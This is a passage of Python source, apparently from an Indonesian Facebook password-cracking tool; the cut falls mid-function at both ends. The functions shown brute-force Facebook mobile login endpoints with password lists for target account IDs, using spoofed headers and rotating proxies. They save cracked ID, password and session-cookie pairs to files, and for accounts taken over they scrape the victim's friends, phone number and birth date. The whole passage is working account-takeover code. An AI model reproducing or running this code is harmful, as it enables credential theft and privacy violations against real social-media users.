'bi_xrwh': 0
}
			headers = {'Host': 'm.trunkstable.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.trunkstable.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.trunkstable.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.trunkstable.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackprode(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = uaasepitgansxc()
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Prode [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def cracktrun(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = uaasepitgansxc()
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Trun [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.trunkstable.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.trunkstable.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.trunkstable.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.trunkstable.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.trunkstable.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
